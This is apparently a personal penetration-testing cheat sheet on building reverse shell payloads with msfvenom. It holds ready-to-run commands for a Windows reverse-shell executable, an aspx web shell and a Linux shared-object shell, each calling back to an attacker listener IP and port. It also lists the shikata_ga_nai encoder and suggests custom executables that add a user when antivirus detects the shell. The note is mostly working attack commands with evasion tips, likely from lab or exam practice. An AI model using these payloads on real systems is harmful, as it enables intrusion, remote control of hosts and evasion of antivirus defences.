---
publish: true
created: 2026-02-24T21:26:31.906+05:30
modified: 2026-06-22T09:01:07.056+05:30
---

To create reverse shell executable. if AV detects, better to create your own malicious executables which adds a user instead of reverse shell.

Also check os and config to create specific to them.

## Windows

### exe

```
msfvenom -p windows/shell_reverse_tcp LPORT=666 LHOST=10.10.14.6 -f exe -o rev.exe

# check encoders
$ msfvenom -l encoders
x86/shikata_ga_nai
```

### asp

```
$ msfvenom -p windows/shell_reverse_tcp LPORT=1234 LHOST=10.10.16.94 -f aspx -o shell.aspx
```

## Linux

### so

This did not work for me. i better write C file that this.

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.238 LPORT=22 -f elf-so -o utils.so
```
